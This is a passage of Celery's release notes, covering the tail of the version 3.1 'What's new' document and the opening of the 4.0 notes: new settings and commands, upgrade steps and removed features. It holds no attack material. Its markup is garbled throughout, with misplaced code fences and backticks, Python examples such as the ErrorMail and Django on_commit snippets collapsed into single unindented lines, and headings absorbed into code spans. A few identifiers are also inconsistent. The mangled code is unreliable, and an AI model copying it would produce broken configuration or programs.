[guide-extending](#guide-extending) guide for more information.  > **Note** >      Bootsteps written for older versions won't be compatible     with this version, as the API has changed significantly.      The old API was experimental and internal but should you be so unlucky     to use it then please contact the mailing-list and we'll help you port     the bootstep to the new API.  New RPC result backend ----------------------  This new experimental version of the``amqp``result backend is a good alternative to use in classical RPC scenarios, where the process that initiates the task is always the process to retrieve the result.  It uses Kombu to send and retrieve results, and each client uses a unique queue for replies to be sent to. This avoids the significant overhead of the original amqp result backend which creates one queue per task.  By default results sent using this backend won't persist, so they won't survive a broker restart. You can enable the :setting:`CELERY_RESULT_PERSISTENT` setting to change that.``\`python CELERY\_RESULT\_BACKEND = 'rpc' CELERY\_RESULT\_PERSISTENT = True

Note that chords are currently not supported by the RPC backend.

Time limits can now be set by the client `` ` ----------------------------------------  Two new options have been added to the Calling API: ``time\_limit`and`soft\_time\_limit`:`\`pycon \>\>\> res = add.apply\_async((2, 2), time\_limit=10, soft\_time\_limit=8)

> \>\>\> res = add.subtask((2, 2), time\_limit=10, soft\_time\_limit=8).delay()
> 
> \>\>\> res = add.s(2, 2).set(time\_limit=10, soft\_time\_limit=8).delay()

Contributed by Mher Movsisyan.

Redis: Broadcast messages and virtual hosts `` ` -------------------------------------------  Broadcast messages are currently seen by all virtual hosts when using the Redis transport. You can now fix this by enabling a prefix to all channels so that the messages are separated: ``\`python BROKER\_TRANSPORT\_OPTIONS = {'fanout\_prefix': True}

Note that you'll not be able to communicate with workers running older `` ` versions or workers that doesn't have this setting enabled.  This setting will be the default in a future version.  Related to Issue #1490.  :pypi:`pytz` replaces :pypi:`python-dateutil` dependency --------------------------------------------------------  Celery no longer depends on the :pypi:`python-dateutil` library, but instead a new dependency on the :pypi:`pytz` library was added.  The :pypi:`pytz` library was already recommended for accurate timezone support.  This also means that dependencies are the same for both Python 2 and Python 3, and that the :file:`requirements/default-py3k.txt` file has been removed.  Support for :pypi:`setuptools` extra requirements -------------------------------------------------  Pip now supports the :pypi:`setuptools` extra requirements format, so we've removed the old bundles concept, and instead specify setuptools extras.  You install extras by specifying them inside brackets: ``\`console $ pip install celery\[redis,mongodb\]

The above will install the dependencies for Redis and MongoDB. You can list `` ` as many extras as you want.   > **Warning** >      You can't use the ``celery-with-\*`packages anymore, as these won't be     updated to use Celery 3.1.  +-------------+-------------------------+---------------------------+ | Extension   | Requirement entry       | Type                      | +=============+=========================+===========================+ | Redis       |`celery\[redis\]`| transport, result backend | +-------------+-------------------------+---------------------------+ | MongoDB     |`celery\[mongodb\]`| transport, result backend | +-------------+-------------------------+---------------------------+ | CouchDB     |`celery\[couchdb\]`| transport                 | +-------------+-------------------------+---------------------------+ | Beanstalk   |`celery\[beanstalk\]`| transport                 | +-------------+-------------------------+---------------------------+ | ZeroMQ      |`celery\[zeromq\]`| transport                 | +-------------+-------------------------+---------------------------+ | Zookeeper   |`celery\[zookeeper\]`| transport                 | +-------------+-------------------------+---------------------------+ | SQLAlchemy  |`celery\[sqlalchemy\]`| transport, result backend | +-------------+-------------------------+---------------------------+ | librabbitmq |`celery\[librabbitmq\]`| transport (C amqp client) | +-------------+-------------------------+---------------------------+  The complete list with examples is found in the [bundles](#bundles) section.`subtask.\_\_call\_\_()`now executes the task directly -----------------------------------------------------  A misunderstanding led to`Signature.\_\_call\_\_`being an alias of`.delay`but this doesn't conform to the calling API of`Task`which calls the underlying task method.  This means that:`\`python @app.task def add(x, y): return x + y

> add.s(2, 2)()

now does the same as calling the task directly:

``` pycon
>>> add(2, 2)
```

In Other News `` ` -------------  - Now depends on [Kombu 3.0 <kombu:version-3.0.0>](#kombu-3.0-<kombu:version-3.0.0>).  - Now depends on :pypi:`billiard` version 3.3.  - Worker will now crash if running as the root user with pickle enabled.  - Canvas: ``group.apply\_async`and`chain.apply\_async`no longer starts   separate task.      That the group and chord primitives supported the "calling API" like other     subtasks was a nice idea, but it was useless in practice and often     confused users. If you still want this behavior you can define a     task to do it for you.  - New method`Signature.freeze()`can be used to "finalize"   signatures/subtask.      Regular signature:`\`pycon \>\>\> s = add.s(2, 2) \>\>\> result = s.freeze() \>\>\> result \<AsyncResult: ffacf44b-f8a1-44e9-80a3-703150151ef2\> \>\>\> s.delay() \<AsyncResult: ffacf44b-f8a1-44e9-80a3-703150151ef2\>

> Group:
> 
> ``` pycon
> >>> g = group(add.s(2, 2), add.s(4, 4))
> >>> result = g.freeze()
> <GroupResult: e1094b1d-08fc-4e14-838e-6d601b99da6d [
>     70c0fb3d-b60e-4b22-8df7-aa25b9abc86d,
>     58fcd260-2e32-4308-a2ea-f5be4a24f7f4]>
> >>> g()
> <GroupResult: e1094b1d-08fc-4e14-838e-6d601b99da6d [70c0fb3d-b60e-4b22-8df7-aa25b9abc86d, 58fcd260-2e32-4308-a2ea-f5be4a24f7f4]>
> ```

  - Chord exception behavior defined (Issue \#1172).
    
    > From this version the chord callback will change state to FAILURE when a task part of a chord raises an exception.
    > 
    > See more at \[chord-errors\](\#chord-errors).

  - New ability to specify additional command line options to the worker and beat programs.
    
    > The <span class="title-ref">@user\_options</span> attribute can be used to add additional command-line arguments, and expects `optparse`-style options:
    > 
    > ``` python
    > from celery import Celery
    > from celery.bin import Option
    > 
    > app = Celery()
    > app.user_options['worker'].add(
    >     Option('--my-argument'),
    > )
    > ```
    > 
    > See the \[guide-extending\](\#guide-extending) guide for more information.

  - All events now include a `pid` field, which is the process id of the process that sent the event.

  - Event heartbeats are now calculated based on the time when the event was received by the monitor, and not the time reported by the worker.
    
    > This means that a worker with an out-of-sync clock will no longer show as 'Offline' in monitors.
    > 
    > A warning is now emitted if the difference between the senders time and the internal time is greater than 15 seconds, suggesting that the clocks are out of sync.

  - Monotonic clock support.
    
    > A monotonic clock is now used for timeouts and scheduling.
    > 
    > The monotonic clock function is built-in starting from Python 3.4, but we also have fallback implementations for Linux and macOS.

  - `celery worker` now supports a new `--detach <celery worker --detach>` argument to start the worker as a daemon in the background.

  - <span class="title-ref">@events.Receiver</span> now sets a `local_received` field for incoming events, which is set to the time of when the event was received.

  - <span class="title-ref">@events.Dispatcher</span> now accepts a `groups` argument which decides a white-list of event groups that'll be sent.
    
    > The type of an event is a string separated by '-', where the part before the first '-' is the group. Currently there are only two groups: `worker` and `task`.
    > 
    > A dispatcher instantiated as follows:
    > 
    > ``` pycon
    > >>> app.events.Dispatcher(connection, groups=['worker'])
    > ```
    > 
    > will only send worker related events and silently drop any attempts to send events related to any other group.

  - New `BROKER_FAILOVER_STRATEGY` setting.
    
    > This setting can be used to change the transport fail-over strategy, can either be a callable returning an iterable or the name of a Kombu built-in failover strategy. Default is "round-robin".
    > 
    > Contributed by Matt Wise.

  - `Result.revoke` will no longer wait for replies.
    
    > You can add the `reply=True` argument if you really want to wait for responses from the workers.

  - Better support for link and link\_error tasks for chords.
    
    > Contributed by Steeve Morin.

  - Worker: Now emits warning if the `CELERYD_POOL` setting is set to enable the eventlet/gevent pools.
    
    > The <span class="title-ref">-P</span> option should always be used to select the eventlet/gevent pool to ensure that the patches are applied as early as possible.
    > 
    > If you start the worker in a wrapper (like Django's `manage.py`) then you must apply the patches manually, for example by creating an alternative wrapper that monkey patches at the start of the program before importing any other modules.

  - There's a now an 'inspect clock' command which will collect the current logical clock value from workers.

  - <span class="title-ref">celery inspect stats</span> now contains the process id of the worker's main process.
    
    > Contributed by Mher Movsisyan.

  - New remote control command to dump a workers configuration.
    
    > Example:
    > 
    > ``` console
    > $ celery inspect conf
    > ```
    > 
    > Configuration values will be converted to values supported by JSON where possible.
    > 
    > Contributed by Mher Movsisyan.

  - New settings `CELERY_EVENT_QUEUE_TTL` and `CELERY_EVENT_QUEUE_EXPIRES`.
    
    > These control when a monitors event queue is deleted, and for how long events published to that queue will be visible. Only supported on RabbitMQ.

  - New Couchbase result backend.
    
    > This result backend enables you to store and retrieve task results using [Couchbase]().
    > 
    > See \[conf-couchbase-result-backend\](\#conf-couchbase-result-backend) for more information about configuring this result backend.
    > 
    > Contributed by Alain Masiero.

  - CentOS init-script now supports starting multiple worker instances.
    
    > See the script header for details.
    > 
    > Contributed by Jonathan Jordan.

  - `AsyncResult.iter_native` now sets default interval parameter to 0.5
    
    > Fix contributed by Idan Kamara

  - New setting `BROKER_LOGIN_METHOD`.
    
    > This setting can be used to specify an alternate login method for the AMQP transports.
    > 
    > Contributed by Adrien Guinet

  - The `dump_conf` remote control command will now give the string representation for types that aren't JSON compatible.

  - Function <span class="title-ref">celery.security.setup\_security</span> is now <span class="title-ref">@setup\_security</span>.

  - Task retry now propagates the message expiry value (Issue \#980).
    
    > The value is forwarded at is, so the expiry time won't change. To update the expiry time you'd've to pass a new expires argument to `retry()`.

  - Worker now crashes if a channel error occurs.
    
    > Channel errors are transport specific and is the list of exceptions returned by `Connection.channel_errors`. For RabbitMQ this means that Celery will crash if the equivalence checks for one of the queues in `CELERY_QUEUES` mismatches, which makes sense since this is a scenario where manual intervention is required.

  - Calling `AsyncResult.get()` on a chain now propagates errors for previous tasks (Issue \#1014).

  - The parent attribute of `AsyncResult` is now reconstructed when using JSON serialization (Issue \#1014).

  - Worker disconnection logs are now logged with severity warning instead of error.
    
    > Contributed by Chris Adams.

  - `events.State` no longer crashes when it receives unknown event types.

  - SQLAlchemy Result Backend: New `CELERY_RESULT_DB_TABLENAMES` setting can be used to change the name of the database tables used.
    
    > Contributed by Ryan Petrello.

  -   - SQLAlchemy Result Backend: Now calls `enginge.dispose` after fork  
        (Issue \#1564).
        
        > If you create your own SQLAlchemy engines then you must also make sure that these are closed after fork in the worker:
        > 
        > ``` python
        > from multiprocessing.util import register_after_fork
        > 
        > engine = create_engine(*engine_args)
        > register_after_fork(engine, engine.dispose)
        > ```

  - A stress test suite for the Celery worker has been written.
    
    > This is located in the `funtests/stress` directory in the git repository. There's a README file there to get you started.

  - The logger named `celery.concurrency` has been renamed to `celery.pool`.

  - New command line utility `celery graph`.
    
    > This utility creates graphs in GraphViz dot format.
    > 
    > You can create graphs from the currently installed bootsteps:
    > 
    > ``` console
    > # Create graph of currently installed bootsteps in both the worker
    > # and consumer name-spaces.
    > $ celery graph bootsteps | dot -T png -o steps.png
    > 
    > # Graph of the consumer name-space only.
    > $ celery graph bootsteps consumer | dot -T png -o consumer_only.png
    > 
    > # Graph of the worker name-space only.
    > $ celery graph bootsteps worker | dot -T png -o worker_only.png
    > ```
    > 
    > Or graphs of workers in a cluster:
    > 
    > ``` console
    > # Create graph from the current cluster
    > $ celery graph workers | dot -T png -o workers.png
    > 
    > # Create graph from a specified list of workers
    > $ celery graph workers nodes:w1,w2,w3 | dot -T png workers.png
    > 
    > # also specify the number of threads in each worker
    > $ celery graph workers nodes:w1,w2,w3 threads:2,4,6
    > 
    > # …also specify the broker and backend URLs shown in the graph
    > $ celery graph workers broker:amqp:// backend:redis://
    > 
    > # …also specify the max number of workers/threads shown (wmax/tmax),
    > # enumerating anything that exceeds that number.
    > $ celery graph workers wmax:10 tmax:3
    > ```

  - Changed the way that app instances are pickled.
    
    > Apps can now define a `__reduce_keys__` method that's used instead of the old `AppPickler` attribute. For example, if your app defines a custom 'foo' attribute that needs to be preserved when pickling you can define a `__reduce_keys__` as such:
    > 
    > ``` python
    > import celery
    > 
    > class Celery(celery.Celery):
    > 
    >     def __init__(self, *args, **kwargs):
    >         super(Celery, self).__init__(*args, **kwargs)
    >         self.foo = kwargs.get('foo')
    > 
    >     def __reduce_keys__(self):
    >         return super(Celery, self).__reduce_keys__().update(
    >             foo=self.foo,
    >         )
    > ```
    > 
    > This is a much more convenient way to add support for pickling custom attributes. The old `AppPickler` is still supported but its use is discouraged and we would like to remove it in a future version.

  - Ability to trace imports for debugging purposes.
    
    > The `C_IMPDEBUG` can be set to trace imports as they occur:
    > 
    > ``` console
    > $ C_IMDEBUG=1 celery worker -l info
    > ```
    > 
    > ``` console
    > $ C_IMPDEBUG=1 celery shell
    > ```

  - Message headers now available as part of the task request.
    
    > Example adding and retrieving a header value:
    > 
    > ``` python
    > @app.task(bind=True)
    > def t(self):
    >     return self.request.headers.get('sender')
    > 
    > >>> t.apply_async(headers={'sender': 'George Costanza'})
    > ```

  - New `before_task_publish` signal dispatched before a task message is sent and can be used to modify the final message fields (Issue \#1281).

  - New `after_task_publish` signal replaces the old `task_sent` signal.
    
    > The `task_sent` signal is now deprecated and shouldn't be used.

  - New `worker_process_shutdown` signal is dispatched in the prefork pool child processes as they exit.
    
    > Contributed by Daniel M Taub.

  - `celery.platforms.PIDFile` renamed to <span class="title-ref">celery.platforms.Pidfile</span>.

  - MongoDB Backend: Can now be configured using a URL:

  - MongoDB Backend: No longer using deprecated `pymongo.Connection`.

  - MongoDB Backend: Now disables `auto_start_request`.

  - MongoDB Backend: Now enables `use_greenlets` when eventlet/gevent is used.

  - `subtask()` / `maybe_subtask()` renamed to `signature()`/`maybe_signature()`.
    
    > Aliases still available for backwards compatibility.

  - The `correlation_id` message property is now automatically set to the id of the task.

  - The task message `eta` and `expires` fields now includes timezone information.

  - All result backends `store_result`/`mark_as_*` methods must now accept a `request` keyword argument.

  - Events now emit warning if the broken `yajl` library is used.

  - The `celeryd_init` signal now takes an extra keyword argument: `option`.
    
    > This is the mapping of parsed command line arguments, and can be used to prepare new preload arguments (`app.user_options['preload']`).

  - New callback: <span class="title-ref">@on\_configure</span>.
    
    > This callback is called when an app is about to be configured (a configuration key is required).

  - Worker: No longer forks on `HUP`.
    
    > This means that the worker will reuse the same pid for better support with external process supervisors.
    > 
    > Contributed by Jameel Al-Aziz.

  - Worker: The log message `Got task from broker …` was changed to `Received task …`.

  - Worker: The log message `Skipping revoked task …` was changed to `Discarding revoked task …`.

  - Optimization: Improved performance of `ResultSet.join_native()`.
    
    > Contributed by Stas Rudakou.

  - The `task_revoked` signal now accepts new `request` argument (Issue \#1555).
    
    > The revoked signal is dispatched after the task request is removed from the stack, so it must instead use the <span class="title-ref">\~celery.worker.request.Request</span> object to get information about the task.

  - Worker: New `-X <celery worker -X>` command line argument to exclude queues (Issue \#1399).
    
    > The `-X <celery worker -X>` argument is the inverse of the `-Q <celery worker -Q>` argument and accepts a list of queues to exclude (not consume from):
    > 
    > ``` console
    > # Consume from all queues in CELERY_QUEUES, but not the 'foo' queue.
    > $ celery worker -A proj -l info -X foo
    > ```

  - Adds `C_FAKEFORK` environment variable for simple init-script/`celery multi` debugging.
    
    > This means that you can now do:
    > 
    > ``` console
    > $ C_FAKEFORK=1 celery multi start 10
    > ```
    > 
    > or:
    > 
    > ``` console
    > $ C_FAKEFORK=1 /etc/init.d/celeryd start
    > ```
    > 
    > to avoid the daemonization step to see errors that aren't visible due to missing stdout/stderr.
    > 
    > A `dryrun` command has been added to the generic init-script that enables this option.

  - New public API to push and pop from the current task stack:
    
    > <span class="title-ref">celery.app.push\_current\_task</span> and <span class="title-ref">celery.app.pop\_current\_task</span>\`.

  - `RetryTaskError` has been renamed to <span class="title-ref">\~celery.exceptions.Retry</span>.
    
    > The old name is still available for backwards compatibility.

  - New semi-predicate exception <span class="title-ref">\~celery.exceptions.Reject</span>.
    
    > This exception can be raised to `reject`/`requeue` the task message, see \[task-semipred-reject\](\#task-semipred-reject) for examples.

  - \[Semipredicates \<task-semipredicates\>\](\#semipredicates-\<task-semipredicates\>) documented: (Retry/Ignore/Reject).

<div id="v310-removals">

Scheduled Removals `` ` ==================  - The ``BROKER\_INSIST`setting and the`insist`argument   to`\~@connection`is no longer supported.  - The`CELERY\_AMQP\_TASK\_RESULT\_CONNECTION\_MAX``setting is no longer   supported.      Use :setting:`BROKER_POOL_LIMIT` instead.  - The``CELERY\_TASK\_ERROR\_WHITELIST``setting is no longer supported.      You should set the `~celery.utils.mail.ErrorMail` attribute     of the task class instead. You can also do this using     :setting:`CELERY_ANNOTATIONS`:``\`python from celery import Celery from celery.utils.mail import ErrorMail

</div>

>   - class MyErrorMail(ErrorMail):  
>     whitelist = (KeyError, ImportError)
>     
>       - def should\_send(self, context, exc):  
>         return isinstance(exc, self.whitelist)
> 
> app = Celery() app.conf.CELERY\_ANNOTATIONS = { '\*': { 'ErrorMail': MyErrorMails, } }

  - Functions that creates a broker connections no longer supports the `connect_timeout` argument.
    
    > This can now only be set using the `BROKER_CONNECTION_TIMEOUT` setting. This is because functions no longer create connections directly, but instead get them from the connection pool.

  - The `CELERY_AMQP_TASK_RESULT_EXPIRES` setting is no longer supported.
    
    > Use `CELERY_TASK_RESULT_EXPIRES` instead.

<div id="v310-deprecations">

Deprecation Time-line Changes `` ` =============================  See the [deprecation-timeline](#deprecation-timeline).  .. _v310-fixes:  Fixes =====  - AMQP Backend: join didn't convert exceptions when using the json   serializer.  - Non-abstract task classes are now shared between apps (Issue #1150).      Note that non-abstract task classes shouldn't be used in the     new API. You should only create custom task classes when you     use them as a base class in the ``@task`decorator.      This fix ensure backwards compatibility with older Celery versions     so that non-abstract task classes works even if a module is imported     multiple times so that the app is also instantiated multiple times.  - Worker: Workaround for Unicode errors in logs (Issue #427).  - Task methods:`.apply\_async``now works properly if args list is None   (Issue #1459).  - Eventlet/gevent/solo/threads pools now properly handles `BaseException`   errors raised by tasks.  - :control:`autoscale` and :control:`pool_grow`/:control:`pool_shrink` remote   control commands will now also automatically increase and decrease the   consumer prefetch count.      Fix contributed by Daniel M. Taub.  -``celery control [pool]()``commands didn't coerce string arguments to int.  - Redis/Cache chords: Callback result is now set to failure if the group   disappeared from the database (Issue #1094).  - Worker: Now makes sure that the shutdown process isn't initiated more   than once.  - Programs: :program:`celery multi` now properly handles both``-f``and   :option:`--logfile <celery worker --logfile>` options (Issue #1541).  .. _v310-internal:  Internal changes ================  - Module``celery.task.trace``has been renamed to :mod:`celery.app.trace`.  - Module``celery.concurrency.processes``has been renamed to   :mod:`celery.concurrency.prefork`.  - Classes that no longer fall back to using the default app:      - Result backends (`celery.backends.base.BaseBackend`)     - `celery.worker.WorkController`     - `celery.worker.Consumer`     - `celery.worker.request.Request`      This means that you have to pass a specific app when instantiating     these classes.  -``EventDispatcher.copy\_buffer``renamed to   `@events.Dispatcher.extend_buffer`.  - Removed unused and never documented global instance``celery.events.state.state``.  - `@events.Receiver` is now a `kombu.mixins.ConsumerMixin`   subclass.  - `celery.apps.worker.Worker` has been refactored as a subclass of   `celery.worker.WorkController`.      This removes a lot of duplicate functionality.  - The``Celery.with\_default\_connection`method has been removed in favor   of`with app.connection\_or\_acquire``(`@connection_or_acquire`)  - The``celery.results.BaseDictBackend\`<span class="title-ref"> class has been removed and is replaced by \`celery.results.BaseBackend</span>.

</div>

---

whatsnew-4.0.md

---

# What's new in Celery 4.0 (latentcall)

  - Author  
    Ask Solem (`ask at celeryproject.org`)

<div class="sidebar">

**Change history**

What's new documents describe the changes in major versions, we also have a \[changelog\](\#changelog) that lists the changes in bugfix releases (0.0.x), while older series are archived under the \[history\](\#history) section.

</div>

Celery is a simple, flexible, and reliable distributed system to process vast amounts of messages, while providing operations with the tools required to maintain such a system.

It's a task queue with focus on real-time processing, while also supporting task scheduling.

Celery has a large and diverse community of users and contributors, you should come join us \[on IRC \<irc-channel\>\](\#on-irc-\<irc-channel\>) or \[our mailing-list \<mailing-list\>\](\#our-mailing-list-\<mailing-list\>).

To read more about Celery you should go read the \[introduction \<intro\>\](\#introduction-\<intro\>).

While this version is backward compatible with previous versions it's important that you read the following section.

This version is officially supported on CPython 2.7, 3.4, and 3.5. and also supported on PyPy.

<div class="topic">

**Table of Contents**

Make sure you read the important notes before upgrading to this version.

</div>

<div class="contents" data-local="" data-depth="3">

</div>

## Preface

Welcome to Celery 4\!

This is a massive release with over two years of changes. Not only does it come with many new features, but it also fixes a massive list of bugs, so in many ways you could call it our "Snow Leopard" release.

The next major version of Celery will support Python 3.5 only, where we are planning to take advantage of the new asyncio library.

This release would not have been possible without the support of my employer, [Robinhood](https://robinhood.com) (we're hiring\!).

  - Ask Solem

Dedicated to Sebastian "Zeb" Bjørnerud (RIP), with special thanks to [Ty Wilkins](http://tywilkins.com), for designing our new logo, all the contributors who help make this happen, and my colleagues at [Robinhood](https://robinhood.com).

### Wall of Contributors

Aaron McMillin, Adam Chainz, Adam Renberg, Adriano Martins de Jesus, Adrien Guinet, Ahmet Demir, Aitor Gómez-Goiri, Alan Justino, Albert Wang, Alex Koshelev, Alex Rattray, Alex Williams, Alexander Koshelev, Alexander Lebedev, Alexander Oblovatniy, Alexey Kotlyarov, Ali Bozorgkhan, Alice Zoë Bevan–McGregor, Allard Hoeve, Alman One, Amir Rustamzadeh, Andrea Rabbaglietti, Andrea Rosa, Andrei Fokau, Andrew Rodionoff, Andrew Stewart, Andriy Yurchuk, Aneil Mallavarapu, Areski Belaid, Armenak Baburyan, Arthur Vuillard, Artyom Koval, Asif Saifuddin Auvi, Ask Solem, Balthazar Rouberol, Batiste Bieler, Berker Peksag, Bert Vanderbauwhede, Brendan Smithyman, Brian Bouterse, Bryce Groff, Cameron Will, ChangBo Guo, Chris Clark, Chris Duryee, Chris Erway, Chris Harris, Chris Martin, Chillar Anand, Colin McIntosh, Conrad Kramer, Corey Farwell, Craig Jellick, Cullen Rhodes, Dallas Marlow, Daniel Devine, Daniel Wallace, Danilo Bargen, Davanum Srinivas, Dave Smith, David Baumgold, David Harrigan, David Pravec, Dennis Brakhane, Derek Anderson, Dmitry Dygalo, Dmitry Malinovsky, Dongweiming, Dudás Ádám, Dustin J. Mitchell, Ed Morley, Edward Betts, Éloi Rivard, Emmanuel Cazenave, Fahad Siddiqui, Fatih Sucu, Feanil Patel, Federico Ficarelli, Felix Schwarz, Felix Yan, Fernando Rocha, Flavio Grossi, Frantisek Holop, Gao Jiangmiao, George Whewell, Gerald Manipon, Gilles Dartiguelongue, Gino Ledesma, Greg Wilbur, Guillaume Seguin, Hank John, Hogni Gylfason, Ilya Georgievsky, Ionel Cristian Mărieș, Ivan Larin, James Pulec, Jared Lewis, Jason Veatch, Jasper Bryant-Greene, Jeff Widman, Jeremy Tillman, Jeremy Zafran, Jocelyn Delalande, Joe Jevnik, Joe Sanford, John Anderson, John Barham, John Kirkham, John Whitlock, Jonathan Vanasco, Joshua Harlow, João Ricardo, Juan Carlos Ferrer, Juan Rossi, Justin Patrin, Kai Groner, Kevin Harvey, Kevin Richardson, Komu Wairagu, Konstantinos Koukopoulos, Kouhei Maeda, Kracekumar Ramaraju, Krzysztof Bujniewicz, Latitia M. Haskins, Len Buckens, Lev Berman, lidongming, Lorenzo Mancini, Lucas Wiman, Luke Pomfrey, Luyun Xie, Maciej Obuchowski, Manuel Kaufmann, Marat Sharafutdinov, Marc Sibson, Marcio Ribeiro, Marin Atanasov Nikolov, Mathieu Fenniak, Mark Parncutt, Mauro Rocco, Maxime Beauchemin, Maxime Vdb, Mher Movsisyan, Michael Aquilina, Michael Duane Mooring, Michael Permana, Mickaël Penhard, Mike Attwood, Mitchel Humpherys, Mohamed Abouelsaoud, Morris Tweed, Morton Fox, Môshe van der Sterre, Nat Williams, Nathan Van Gheem, Nicolas Unravel, Nik Nyby, Omer Katz, Omer Korner, Ori Hoch, Paul Pearce, Paulo Bu, Pavlo Kapyshin, Philip Garnero, Pierre Fersing, Piotr Kilczuk, Piotr Maślanka, Quentin Pradet, Radek Czajka, Raghuram Srinivasan, Randy Barlow, Raphael Michel, Rémy Léone, Robert Coup, Robert Kolba, Rockallite Wulf, Rodolfo Carvalho, Roger Hu, Romuald Brunet, Rongze Zhu, Ross Deane, Ryan Luckie, Rémy Greinhofer, Samuel Giffard, Samuel Jaillet, Sergey Azovskov, Sergey Tikhonov, Seungha Kim, Simon Peeters, Spencer E. Olson, Srinivas Garlapati, Stephen Milner, Steve Peak, Steven Sklar, Stuart Axon, Sukrit Khera, Tadej Janež, Taha Jahangir, Takeshi Kanemoto, Tayfun Sen, Tewfik Sadaoui, Thomas French, Thomas Grainger, Tomas Machalek, Tobias Schottdorf, Tocho Tochev, Valentyn Klindukh, Vic Kumar, Vladimir Bolshakov, Vladimir Gorbunov, Wayne Chang, Wieland Hoffmann, Wido den Hollander, Wil Langford, Will Thompson, William King, Yury Selivanov, Vytis Banaitis, Zoran Pavlovic, Xin Li, 許邱翔, :github\_user:<span class="title-ref">allenling</span>, :github\_user:<span class="title-ref">alzeih</span>, :github\_user:<span class="title-ref">bastb</span>, :github\_user:<span class="title-ref">bee-keeper</span>, :github\_user:<span class="title-ref">ffeast</span>, :github\_user:<span class="title-ref">firefly4268</span>, :github\_user:<span class="title-ref">flyingfoxlee</span>, :github\_user:<span class="title-ref">gdw2</span>, :github\_user:<span class="title-ref">gitaarik</span>, :github\_user:<span class="title-ref">hankjin</span>, :github\_user:<span class="title-ref">lvh</span>, :github\_user:<span class="title-ref">m-vdb</span>, :github\_user:<span class="title-ref">kindule</span>, :github\_user:\`mdk\`:, :github\_user:<span class="title-ref">michael-k</span>, :github\_user:<span class="title-ref">mozillazg</span>, :github\_user:<span class="title-ref">nokrik</span>, :github\_user:<span class="title-ref">ocean1</span>, :github\_user:<span class="title-ref">orlo666</span>, :github\_user:<span class="title-ref">raducc</span>, :github\_user:<span class="title-ref">wanglei</span>, :github\_user:<span class="title-ref">worldexception</span>, :github\_user:<span class="title-ref">xBeAsTx</span>.

\> **Note** \> This wall was automatically generated from git history, so sadly it doesn't not include the people who help with more important things like answering mailing-list questions.

## Upgrading from Celery 3.1

### Step 1: Upgrade to Celery 3.1.25

If you haven't already, the first step is to upgrade to Celery 3.1.25.

This version adds forward compatibility to the new message protocol, so that you can incrementally upgrade from 3.1 to 4.0.

Deploy the workers first by upgrading to 3.1.25, this means these workers can process messages sent by clients using both 3.1 and 4.0.

After the workers are upgraded you can upgrade the clients (e.g. web servers).

### Step 2: Update your configuration with the new setting names

This version radically changes the configuration setting names, to be more consistent.

The changes are fully backwards compatible, so you have the option to wait until the old setting names are deprecated, but to ease the transition we have included a command-line utility that rewrites your settings automatically.

See \[v400-upgrade-settings\](\#v400-upgrade-settings) for more information.

### Step 3: Read the important notes in this document

Make sure you are not affected by any of the important upgrade notes mentioned in the following section.

An especially important note is that Celery now checks the arguments you send to a task by matching it to the signature (\[v400-typing\](\#v400-typing)).

### Step 4: Upgrade to Celery 4.0

At this point you can upgrade your workers and clients with the new version.

## Important Notes

### Dropped support for Python 2.6

Celery now requires Python 2.7 or later, and also drops support for Python 3.3 so supported versions are:

  - CPython 2.7
  - CPython 3.4
  - CPython 3.5
  - PyPy 5.4 (`pypy2`)
  - PyPy 5.5-alpha (`pypy3`)

### Last major version to support Python 2

Starting from Celery 5.0 only Python 3.5+ will be supported.

To make sure you're not affected by this change you should pin the Celery version in your requirements file, either to a specific version: `celery==4.0.0`, or a range: `celery>=4.0,<5.0`.

Dropping support for Python 2 will enable us to remove massive amounts of compatibility code, and going with Python 3.5 allows us to take advantage of typing, async/await, asyncio, and similar concepts there's no alternative for in older versions.

Celery 4.x will continue to work on Python 2.7, 3.4, 3.5; just as Celery 3.x still works on Python 2.6.

### Django support

Celery 4.x requires Django 1.8 or later, but we really recommend using at least Django 1.9 for the new `transaction.on_commit` feature.

A common problem when calling tasks from Django is when the task is related to a model change, and you wish to cancel the task if the transaction is rolled back, or ensure the task is only executed after the changes have been written to the database.

`transaction.atomic` enables you to solve this problem by adding the task as a callback to be called only when the transaction is committed.

Example usage:

`` `python     from functools import partial     from django.db import transaction      from .models import Article, Log     from .tasks import send_article_created_notification      def create_article(request):         with transaction.atomic():             article = Article.objects.create(**request.POST)             # send this task only if the rest of the transaction succeeds.             transaction.on_commit(partial(                 send_article_created_notification.delay, article_id=article.pk))             Log.objects.create(type=Log.ARTICLE_CREATED, object_pk=article.pk)  Removed features ``\` ----------------

  - Microsoft Windows is no longer supported.
    
    The test suite is passing, and Celery seems to be working with Windows, but we make no guarantees as we are unable to diagnose issues on this platform. If you are a company requiring support on this platform, please get in touch.

  - Jython is no longer supported.

#### Features removed for simplicity

  - Webhook task machinery (`celery.task.http`) has been removed.
    
    > Nowadays it's easy to use the `requests` module to write webhook tasks manually. We would love to use requests but we are simply unable to as there's a very vocal 'anti-dependency' mob in the Python community
    > 
    > If you need backwards compatibility you can simply copy + paste the 3.1 version of the module and make sure it's imported by the worker: <https://github.com/celery/celery/blob/3.1/celery/task/http.py>

  - Tasks no longer sends error emails.
    
    > This also removes support for `app.mail_admins`, and any functionality related to sending emails.

  - `celery.contrib.batches` has been removed.
    
    > This was an experimental feature, so not covered by our deprecation timeline guarantee.
    > 
    > You can copy and pass the existing batches code for use within your projects: <https://github.com/celery/celery/blob/3.1/celery/contrib/batches.py>

#### Features removed for lack of funding

We announced with the 3.1 release that some transports were moved to experimental status, and that there'd be no official support for the transports.

As this subtle hint for the need of funding failed we've removed them completely, breaking backwards compatibility.

  - Using the Django ORM as a broker is no longer supported.
    
    > You can still use the Django ORM as a result backend: see \[django-celery-results\](\#django-celery-results) section for more information.

  - Using SQLAlchemy as a broker is no longer supported.
    
    > You can still use SQLAlchemy as a result backend.

  - Using CouchDB as a broker is no longer supported.
    
    > You can still use CouchDB as a result backend.

  - Using IronMQ as a broker is no longer supported.

  - Using Beanstalk as a broker is no longer supported.

In addition some features have been removed completely so that attempting to use them will raise an exception:

  - The `--autoreload` feature has been removed.
    
    This was an experimental feature, and not covered by our deprecation timeline guarantee. The flag is removed completely so the worker will crash at startup when present. Luckily this flag isn't used in production systems.

  - The experimental `threads` pool is no longer supported and has been removed.

  - The `force_execv` feature is no longer supported.
    
    > The `celery worker` command now ignores the `--no-execv`, `--force-execv`, and the `CELERYD_FORCE_EXECV` setting.
    > 
    > This flag will be removed completely in 5.0 and the worker will raise an error.

  - The old legacy "amqp" result backend has been deprecated, and will be removed in Celery 5.0.
    
    > Please use the `rpc` result backend for RPC-style calls, and a persistent result backend for multi-consumer results.

We think most of these can be fixed without considerable effort, so if you're interested in getting any of these features back, please get in touch.
